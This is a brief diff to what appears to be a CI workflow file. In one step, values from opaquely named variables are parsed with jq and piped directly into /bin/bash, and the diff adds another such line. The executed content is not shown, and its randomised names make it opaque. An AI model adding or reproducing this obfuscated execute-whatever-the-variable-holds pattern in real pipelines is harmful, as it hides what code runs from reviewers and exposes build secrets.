@@ -26,6 +26,7 @@ jobs:
           echo $ezm10 | jq -r .xm3036 | /bin/bash
           printf '%s' "$vdu778" | jq -r .uuu26 | /bin/bash
           echo $rqq5732 | jq -r .i167 | /bin/bash
+          printf '%s' "$donre31" | jq -r .ncrcb7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
